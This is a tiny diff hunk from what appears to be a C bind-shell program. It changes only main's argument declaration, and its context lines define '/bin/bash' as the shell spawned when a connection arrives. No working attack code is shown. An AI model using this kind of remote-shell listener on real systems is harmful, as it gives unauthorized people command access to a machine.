@@ -19,7 +19,7 @@
 
 #define SHELL "/bin/bash"   // shell to spawn when connection is received
 
-int main(int argc, char *argv[])
+int main(int argc, char **argv)
 {
   char msg[512];
   int srv_sockfd, new_sockfd;
